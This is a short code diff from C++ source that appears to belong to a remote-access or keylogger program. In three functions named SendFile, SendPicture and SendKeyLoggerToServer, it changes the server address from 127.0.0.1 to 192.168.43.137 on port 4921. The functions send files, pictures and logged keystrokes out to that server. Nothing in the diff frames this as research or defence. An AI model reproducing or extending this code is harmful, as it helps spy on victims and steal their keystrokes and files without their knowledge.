@@ -170,7 +170,7 @@ void SendFile(char * newFile)
 
 	//Try connecting...
 	addrinfo *target;
-	error = getaddrinfo("127.0.0.1", "4921", &hints, &target);
+	error = getaddrinfo("192.168.43.137", "4921", &hints, &target);
 	connect(s, target->ai_addr, (int)target->ai_addrlen);
 
 	char remoteFILE[1024];
@@ -670,7 +670,7 @@ void SendPicture(string fileName, string cmd)
 	}
 
 	addrinfo *target;
-	error = getaddrinfo("127.0.0.1", "4921", &hints, &target);
+	error = getaddrinfo("192.168.43.137", "4921", &hints, &target);
 	connect(s, target->ai_addr, (int)target->ai_addrlen);
 
 	char remoteFILE[1024];
@@ -837,7 +837,7 @@ void SendKeyLoggerToServer(string sharedKey)
 
 	//Try connecting...
 	addrinfo *target;
-	error = getaddrinfo("127.0.0.1", "4921", &hints, &target);
+	error = getaddrinfo("192.168.43.137", "4921", &hints, &target);
 	connect(s, target->ai_addr, (int)target->ai_addrlen);
 
 	while (storeKeys)
